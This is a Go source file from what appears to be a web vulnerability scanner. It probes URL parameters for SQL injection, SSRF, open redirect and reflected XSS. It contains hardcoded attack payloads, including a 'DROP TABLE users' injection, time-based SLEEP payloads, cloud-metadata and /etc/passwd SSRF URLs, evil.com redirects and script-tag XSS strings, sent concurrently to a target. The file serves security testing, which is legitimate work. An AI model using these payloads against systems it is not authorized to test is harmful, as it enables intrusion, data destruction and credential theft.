package vuln

import (
	core "Akemi/internal/core"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
	// io import kept for legacy probes; regexp/sync also used by legacy code.
)

// VulnType categorizes the kind of vulnerability detected.
type VulnType string

const (
	VulnSQLi            VulnType = "SQL Injection"
	VulnSSRF            VulnType = "SSRF"
	VulnOpenRedirect    VulnType = "Open Redirect"
	VulnXSS             VulnType = "Reflected XSS"
	VulnLFI             VulnType = "Local File Inclusion"
	VulnRFI             VulnType = "Remote File Inclusion"
	VulnCMDi            VulnType = "OS Command Injection"
	VulnSSTI            VulnType = "Server-Side Template Injection"
	VulnCRLF            VulnType = "CRLF Injection"
	VulnXXE             VulnType = "XML External Entity"
	VulnHostHeader      VulnType = "Host Header Injection"
	VulnCORS            VulnType = "CORS Misconfiguration"
	VulnSecurityHeaders VulnType = "Missing Security Headers"
	VulnDeserialization VulnType = "Insecure Deserialization"

	// Deserialization tech-specific types (used by GadgetForge)
	VulnPHPDeserial    VulnType = "PHP Deserialization"
	VulnJavaDeserial   VulnType = "Java Deserialization"
	VulnDotNetDeserial VulnType = "NET Deserialization"
	VulnPyPickle       VulnType = "Python Pickle RCE"
	VulnNodeDeserial   VulnType = "Node.js Deserialization"
	VulnRubyDeserial   VulnType = "Ruby Deserialization"

	// Additional vuln types
	VulnNoSQLi         VulnType = "NoSQL Injection"
	VulnLDAPi          VulnType = "LDAP Injection"
	VulnXPathI         VulnType = "XPath Injection"
	VulnELI            VulnType = "Expression Language Injection"
	VulnGraphQL        VulnType = "GraphQL Injection"
	VulnProtoPollution VulnType = "Prototype Pollution"
	VulnJWT            VulnType = "JWT Weakness"
	VulnIDOR           VulnType = "Insecure Direct Object Reference"
	VulnLog4Shell      VulnType = "Log4Shell"
	VulnCachePoisoning VulnType = "Cache Poisoning"
)

// VulnFinding holds the details of a confirmed or suspected vulnerability.
type VulnFinding struct {
	Type        VulnType       `json:"type"`
	URL         string         `json:"url"`
	Param       string         `json:"param"`
	Payload     string         `json:"payload"`
	Evidence    string         `json:"evidence"` // What in the response confirmed the vuln
	Severity    string         `json:"severity"` // "HIGH", "MEDIUM", "LOW"
	Inject      string         `json:"inject,omitempty"`
	Method      string         `json:"method,omitempty"`
	HeaderName  string         `json:"header_name,omitempty"`
	ContentType string         `json:"content_type,omitempty"`
	TemplateID  string         `json:"template_id,omitempty"`
	RequiresOOB bool           `json:"requires_oob,omitempty"`
	Tags        []string       `json:"tags,omitempty"`
	Detection   string         `json:"detection,omitempty"`
	Request     RequestContext `json:"request_context,omitempty"`
	Hints       ExploitHints   `json:"exploit_hints,omitempty"`
}

// RequestContext preserves enough request state to replay an exploitation
// attempt without re-deriving the original injection point.
type RequestContext struct {
	ReplayURL   string            `json:"replay_url,omitempty"`
	BaseURL     string            `json:"base_url,omitempty"`
	Method      string            `json:"method,omitempty"`
	Inject      string            `json:"inject,omitempty"`
	Headers     map[string]string `json:"headers,omitempty"`
	Body        string            `json:"body,omitempty"`
	ContentType string            `json:"content_type,omitempty"`
	TargetParam string            `json:"target_param,omitempty"`
	HeaderName  string            `json:"header_name,omitempty"`
	CookieName  string            `json:"cookie_name,omitempty"`
	PathHint    string            `json:"path_hint,omitempty"`
}

// ExploitHints stores normalized hints that the exploitation engine can use
// to select strategies and prioritize payload families.
type ExploitHints struct {
	Tech           string   `json:"tech,omitempty"`
	Frameworks     []string `json:"frameworks,omitempty"`
	Stack          []string `json:"stack,omitempty"`
	Exploitability string   `json:"exploitability,omitempty"`
	Notes          []string `json:"notes,omitempty"`
}

// ProbeConfig holds the configuration for the vuln prober.
type ProbeConfig struct {
	Timeout      int
	Threads      int
	TemplateDir  string   // Directory containing YAML probe templates (default: ./probes/)
	TemplateTags []string // Filter templates by tags (e.g. ["sqli", "high"])
	TemplateIDs  []string // Run specific templates by ID
	UseTemplates bool     // If true, use YAML templates; if false, use legacy hardcoded probes
	Quiet        bool     // Suppress terminal progress output when embedded in TUI/service flows
	Fingerprint  bool     // Enable passive target fingerprinting before probing
	Prioritize   bool     // Enable adaptive template prioritization (requires --fingerprint)
}

// --- SQLi Detection ---

var sqliPayloads = []string{
	"'",
	"''",
	"`",
	"\"",
	"1' OR '1'='1",
	"1' OR '1'='1'--",
	"' OR 1=1--",
	"' OR 'x'='x",
	"1; DROP TABLE users--",
	"1 UNION SELECT NULL--",
	"1 AND SLEEP(3)--",
	"1' AND SLEEP(3)--",
}

// SQL error patterns that indicate a vulnerable response
var sqliErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)you have an error in your sql syntax`),
	regexp.MustCompile(`(?i)warning.*mysql`),
	regexp.MustCompile(`(?i)unclosed quotation mark`),
	regexp.MustCompile(`(?i)quoted string not properly terminated`),
	regexp.MustCompile(`(?i)pg_query\(\).*failed`),
	regexp.MustCompile(`(?i)ORA-[0-9]{4,}`),
	regexp.MustCompile(`(?i)Microsoft OLE DB Provider for SQL Server`),
	regexp.MustCompile(`(?i)SQLite3::query`),
	regexp.MustCompile(`(?i)sqlite_error`),
	regexp.MustCompile(`(?i)supplied argument is not a valid (MySQL|PostgreSQL)`),
	regexp.MustCompile(`(?i)error in your SQL syntax`),
	regexp.MustCompile(`(?i)Dynamic SQL Error`),
}

// probeSQLi tests a single parameter for error-based and time-based SQLi.
func probeSQLi(client *http.Client, baseURL string, param string, otherParams url.Values) *VulnFinding {
	baselineURL := buildQueryURL(baseURL, otherParams)
	baselineResp, _ := timedGET(client, baselineURL)
	baselineBody := ""
	if baselineResp != nil {
		baselineBody = baselineResp.BodyStr
	}
	baselineMedian, _ := measureMedianDuration(2, func() (*TimedResponse, error) {
		return timedGET(client, baselineURL)
	})

	for _, payload := range sqliPayloads {
		params := cloneValues(otherParams)
		params.Set(param, payload)

		testURL := buildQueryURL(baseURL, params)

		start := time.Now()
		resp, err := client.Get(testURL)
		elapsed := time.Since(start)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Error-based detection
		for _, pattern := range sqliErrorPatterns {
			if pattern.MatchString(bodyStr) && !pattern.MatchString(baselineBody) {
				return &VulnFinding{
					Type:     VulnSQLi,
					URL:      testURL,
					Param:    param,
					Payload:  payload,
					Evidence: fmt.Sprintf("SQL error pattern matched: %s", pattern.String()),
					Severity: "HIGH",
					Inject:   "query_params",
					Method:   http.MethodGet,
				}
			}
		}

		// Time-based detection: if payload has SLEEP and response took 3+ seconds
		if strings.Contains(strings.ToUpper(payload), "SLEEP") && elapsed >= baselineMedian+minimumAddedDelay(3*time.Second) {
			return &VulnFinding{
				Type:     VulnSQLi,
				URL:      testURL,
				Param:    param,
				Payload:  payload,
				Evidence: fmt.Sprintf("Response delayed %.2fs (time-based blind)", elapsed.Seconds()),
				Severity: "HIGH",
				Inject:   "query_params",
				Method:   http.MethodGet,
			}
		}
	}
	return nil
}

// --- SSRF Detection ---

var ssrfPayloads = []string{
	"http://169.254.169.254/latest/meta-data/", // AWS metadata
	"http://169.254.169.254/",
	"http://metadata.google.internal/",         // GCP metadata
	"http://100.100.100.200/latest/meta-data/", // Alibaba metadata
	"http://127.0.0.1/",
	"http://localhost/",
	"http://0.0.0.0/",
	"http://[::1]/",
	"file:///etc/passwd",
	"dict://127.0.0.1:6379/",
}

// SSRF evidence patterns in response body
var ssrfEvidencePatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)ami-id`), // AWS metadata
	regexp.MustCompile(`(?i)instance-id`),
	regexp.MustCompile(`(?i)root:.*:0:0:`), // /etc/passwd
	regexp.MustCompile(`(?i)metadata\.google\.internal`),
	regexp.MustCompile(`(?i)"computeMetadata"`),
}

// probeSSRF tests a single parameter for SSRF using direct response evidence only.
func probeSSRF(client *http.Client, baseURL string, param string, otherParams url.Values) *VulnFinding {
	for _, payload := range ssrfPayloads {
		params := cloneValues(otherParams)
		params.Set(param, payload)
		testURL := baseURL + "?" + params.Encode()

		resp, err := client.Get(testURL)
		if err != nil {
			// SSRF can cause connection errors too — note but continue
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check if response body leaks internal content
		for _, pattern := range ssrfEvidencePatterns {
			if pattern.MatchString(bodyStr) {
				return &VulnFinding{
					Type:     VulnSSRF,
					URL:      testURL,
					Param:    param,
					Payload:  payload,
					Evidence: fmt.Sprintf("Internal content in response: matched %s", pattern.String()),
					Severity: "HIGH",
					Inject:   "query_params",
					Method:   http.MethodGet,
				}
			}
		}
	}
	return nil
}

// --- Open Redirect Detection ---

var redirectPayloads = []string{
	"https://evil.com",
	"//evil.com",
	"//evil.com/%2f..",
	"https://evil.com?legit.com",
	"/%09/evil.com",
	"/\\evil.com",
	"https:evil.com",
	"javascript:alert(1)",
}

// probeOpenRedirect tests a parameter for open redirect by tracking Location headers.
func probeOpenRedirect(client *http.Client, baseURL string, param string, otherParams url.Values) *VulnFinding {
	// Use a non-redirecting client so we can inspect Location header directly
	noRedirectClient := &http.Client{
		Timeout:   client.Timeout,
		Transport: client.Transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, payload := range redirectPayloads {
		params := cloneValues(otherParams)
		params.Set(param, payload)
		testURL := baseURL + "?" + params.Encode()

		resp, err := noRedirectClient.Get(testURL)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// Check for 3xx redirect pointing to our payload domain
		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
			location := resp.Header.Get("Location")
			if strings.Contains(location, "evil.com") ||
				strings.Contains(location, "javascript:") {
				return &VulnFinding{
					Type:     VulnOpenRedirect,
					URL:      testURL,
					Param:    param,
					Payload:  payload,
					Evidence: fmt.Sprintf("Redirected to: %s (HTTP %d)", location, resp.StatusCode),
					Severity: "MEDIUM",
					Inject:   "query_params",
					Method:   http.MethodGet,
				}
			}
		}
	}
	return nil
}

// --- Reflected XSS Detection ---

var xssPayloads = []string{
	`<script>alert(1)</script>`,
	`"><script>alert(1)</script>`,
	`'><script>alert(1)</script>`,
	`<img src=x onerror=alert(1)>`,
	`javascript:alert(1)`,
	`<svg onload=alert(1)>`,
	`"><img src=x onerror=alert(1)>`,
}

// probeXSS tests a parameter for reflected XSS by checking if the payload echoes in the response.
func probeXSS(client *http.Client, baseURL string, param string, otherParams url.Values) *VulnFinding {
	baselineURL := buildQueryURL(baseURL, otherParams)
	baselineResp, _ := timedGET(client, baselineURL)
	baselineBody := ""
	if baselineResp != nil {
		baselineBody = baselineResp.BodyStr
	}

	for _, payload := range xssPayloads {
		params := cloneValues(otherParams)
		params.Set(param, payload)
		testURL := buildQueryURL(baseURL, params)

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		// Check if the raw payload is reflected in the response (unencoded = likely vulnerable)
		if strings.Contains(string(body), payload) && !strings.Contains(baselineBody, payload) {
			return &VulnFinding{
				Type:     VulnXSS,
				URL:      testURL,
				Param:    param,
				Payload:  payload,
				Evidence: "Payload reflected unencoded in response body",
				Severity: "MEDIUM",
				Inject:   "query_params",
				Method:   http.MethodGet,
			}
		}
	}
	return nil
}

// --- Main Probe Entry Point ---

// ProbeParams is the main entry point: given a URL (typically from your
// DiscoverParams output), it tests for vulnerabilities either via YAML
// templates (UseTemplates=true) or the legacy hardcoded probes.
func ProbeParams(rawURL string, cfg ProbeConfig) ([]VulnFinding, error) {
	return ProbeParamsWithCandidates(rawURL, nil, cfg)
}

func ProbeParamsWithCandidates(rawURL string, candidateParams []string, cfg ProbeConfig) ([]VulnFinding, error) {
	if cfg.Threads == 0 {
		cfg.Threads = 5
	}

	// ── Context-Aware Fingerprinting ─────────────────────
	var targetCtx *core.TargetContext
	if cfg.Fingerprint {
		client := core.CreateHTTPClient(cfg.Timeout)
		var err error
		targetCtx, err = FingerprintTarget(rawURL, candidateParams, client)
		if err != nil {
			if !cfg.Quiet {
				fmt.Printf("[!] Fingerprinting warning: %v\n", err)
			}
		} else if !cfg.Quiet {
			PrintFingerprintSummary(targetCtx)
		}
	}

	// ── Template Engine Mode ────────────────────────────
	if cfg.UseTemplates {
		templateDir := cfg.TemplateDir
		if templateDir == "" {
			templateDir = "./probes"
		}

		templates, err := LoadTemplates(templateDir)
		if err != nil {
			return nil, fmt.Errorf("error loading templates from %s: %w", templateDir, err)
		}

		if len(templates) == 0 {
			return nil, fmt.Errorf("no templates found in %s", templateDir)
		}

		// Filter by tags or IDs if specified
		if len(cfg.TemplateTags) > 0 || len(cfg.TemplateIDs) > 0 {
			templates = FilterTemplates(templates, cfg.TemplateTags, cfg.TemplateIDs)
			if len(templates) == 0 {
				return nil, fmt.Errorf("no templates match the specified tags/IDs")
			}
		}

		if !cfg.Quiet {
			fmt.Printf("[*] Loaded %d probe template(s)\n", len(templates))
		}
		return ExecuteAllTemplates(templates, rawURL, candidateParams, cfg, targetCtx)
	}

	// ── Legacy Mode (backward compatible) ───────────────
	return legacyProbeParams(rawURL, candidateParams, cfg)
}

// legacyProbeParams runs the original hardcoded SQLi/SSRF/XSS/OpenRedirect probes.
func legacyProbeParams(rawURL string, candidateParams []string, cfg ProbeConfig) ([]VulnFinding, error) {
	rawURL = core.EnsureProtocol(rawURL)
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("error parsing URL: %w", err)
	}

	queryParams := parsed.Query()
	paramNames := mergeParamNames(queryParams, candidateParams)
	if len(paramNames) == 0 {
		return nil, fmt.Errorf("no query parameters found in URL — run param mining first")
	}

	baseURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parsed.Path)
	client := core.CreateHTTPClient(cfg.Timeout)

	var findings []VulnFinding
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, cfg.Threads)

	if !cfg.Quiet {
		fmt.Printf("\n[*] Probing %d parameter(s) on %s (legacy mode)\n", len(paramNames), baseURL)
		fmt.Printf("[*] Tests: SQLi | SSRF | Open Redirect | XSS\n")
		fmt.Printf("%s\n", strings.Repeat("-", 50))
	}

	for _, param := range paramNames {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			if !cfg.Quiet {
				fmt.Printf("[~] Testing param: %s\n", p)
			}

			// SQLi
			if finding := probeSQLi(client, baseURL, p, queryParams); finding != nil {
				mu.Lock()
				findings = append(findings, *finding)
				mu.Unlock()
				if !cfg.Quiet {
					printFinding(*finding)
				}
			}

			// SSRF
			if finding := probeSSRF(client, baseURL, p, queryParams); finding != nil {
				mu.Lock()
				findings = append(findings, *finding)
				mu.Unlock()
				if !cfg.Quiet {
					printFinding(*finding)
				}
			}

			// Open Redirect
			if finding := probeOpenRedirect(client, baseURL, p, queryParams); finding != nil {
				mu.Lock()
				findings = append(findings, *finding)
				mu.Unlock()
				if !cfg.Quiet {
					printFinding(*finding)
				}
			}

			// XSS
			if finding := probeXSS(client, baseURL, p, queryParams); finding != nil {
				mu.Lock()
				findings = append(findings, *finding)
				mu.Unlock()
				if !cfg.Quiet {
					printFinding(*finding)
				}
			}

		}(param)
	}

	wg.Wait()
	return findings, nil
}

// printFinding logs a confirmed finding to stdout with severity color codes.
func printFinding(f VulnFinding) {
	prefix := "[MEDIUM]"
	if f.Severity == "HIGH" {
		prefix = "[ HIGH ]"
	} else if f.Severity == "LOW" {
		prefix = "[ LOW  ]"
	}
	fmt.Printf("\n%s *** %s FOUND ***\n", prefix, f.Type)
	fmt.Printf("         URL     : %s\n", f.URL)
	fmt.Printf("         Param   : %s\n", f.Param)
	fmt.Printf("         Payload : %s\n", f.Payload)
	fmt.Printf("         Evidence: %s\n", f.Evidence)
}

// PrintVulnSummary prints all findings in a final summary table grouped by severity.
func PrintVulnSummary(findings []VulnFinding) {
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("  VULNERABILITY SUMMARY — %d finding(s)\n", len(findings))
	fmt.Printf("%s\n", strings.Repeat("=", 60))

	if len(findings) == 0 {
		fmt.Println("  No vulnerabilities detected.")
		return
	}

	// Group by severity
	bySeverity := map[string][]VulnFinding{}
	for _, f := range findings {
		bySeverity[f.Severity] = append(bySeverity[f.Severity], f)
	}

	idx := 1
	for _, sev := range []string{"HIGH", "MEDIUM", "LOW"} {
		group, ok := bySeverity[sev]
		if !ok || len(group) == 0 {
			continue
		}
		fmt.Printf("\n  ── %s (%d) ──\n", sev, len(group))
		for _, f := range group {
			fmt.Printf("  [%d] %s — param: %s\n", idx, f.Type, f.Param)
			fmt.Printf("       URL: %s\n", f.URL)
			fmt.Printf("       Evidence: %s\n", f.Evidence)
			idx++
		}
	}
	fmt.Println()
}

func mergeParamNames(existing url.Values, candidateParams []string) []string {
	ordered := make([]string, 0, len(existing)+len(candidateParams))
	seen := make(map[string]bool, len(existing)+len(candidateParams))

	for name := range existing {
		name = strings.TrimSpace(name)
		if name == "" || seen[name] {
			continue
		}
		seen[name] = true
		ordered = append(ordered, name)
	}

	for _, name := range candidateParams {
		name = strings.TrimSpace(name)
		if name == "" || seen[name] {
			continue
		}
		seen[name] = true
		ordered = append(ordered, name)
	}

	return ordered
}

// cloneValues returns a deep copy of url.Values to avoid mutating the original.
func cloneValues(src url.Values) url.Values {
	clone := url.Values{}
	for k, v := range src {
		clone[k] = append([]string{}, v...)
	}
	return clone
}
